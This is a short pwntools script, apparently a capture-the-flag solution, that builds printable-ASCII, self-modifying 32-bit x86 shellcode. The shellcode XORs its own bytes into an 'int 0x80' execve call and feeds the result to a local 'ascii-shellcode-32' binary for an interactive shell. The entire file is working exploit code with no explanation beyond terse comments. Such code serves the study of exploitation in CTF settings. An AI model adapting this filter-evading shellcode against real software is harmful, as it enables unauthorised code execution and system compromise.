from pwn import *

shellcode = asm('''
push   eax
pop    edx # store eax in edx

push   0x31 # zero eax
pop    eax
xor    al, 0x31
dec    eax # gets us ff

xor [edx + 0x1e], al
xor [edx + 0x1f], al

push 0x7a
push esp
pop  ebx

push 0x31
pop  eax
xor  al, 0x31
push eax
push eax
pop  ecx
pop  edx

push 0xb
pop  eax

.dc.b 0x32, 0x7f # these ^ ff = int 0x80
''')

print(disasm(shellcode))

with open('shellcode.bin', 'wb') as f:
    f.write(shellcode)

io = process("ascii-shellcode-32", env={"PATH":"$PATH:."})


io.interactive()
